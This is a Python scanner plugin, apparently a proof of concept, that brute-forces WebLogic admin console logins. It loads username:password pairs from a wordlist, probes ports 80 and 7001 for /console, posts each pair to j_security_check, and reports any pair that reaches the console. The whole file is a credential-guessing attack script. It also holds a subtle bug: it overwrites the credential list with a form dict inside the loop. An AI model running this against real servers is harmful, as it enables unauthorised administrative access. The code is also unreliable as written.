import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def load_dict():
    data =  []

    with open('./data/dict/weblogic_weak','r') as f:
        dict_data = f.readlines()
    
    for i in dict_data:
        user,passwd = i.split(':')
        data.append([user,passwd])

    return data    
    

def poc(url):
    poc_type = 'weblogic:weakpasswd'

    ports = ['80','7001']
    port_info = {}

    port_info,ports = port_monitor(url, poc_type, ports)

    page_info,ports = page_monitor(url, '/console', poc_type, ports)
    port_info.update(page_info)

    data = load_dict()

    for port in ports:
        for i in data:
            user,pwd = i
            data = {'j_username': user, 'j_password': pwd}
            try:
                s = requests.post('http://{}:{}/console/j_security_check'.format(url,port), data=data, timeout=config.time_out)
                if s.content.count(b'Home Page') != 0 or s.content.count(b'WebLogic Server Console') != 0 or s.content.count(b'console.portal') != 0:
                    port_info[port] = [1,poc_type,'user:{} passwd:{}'.format(user,pwd)]
                    break
            except:
                port_info[port] = [0,poc_type,'Conect failed']
        
            port_info[port] = [0,poc_type,'Not work']

    return port_info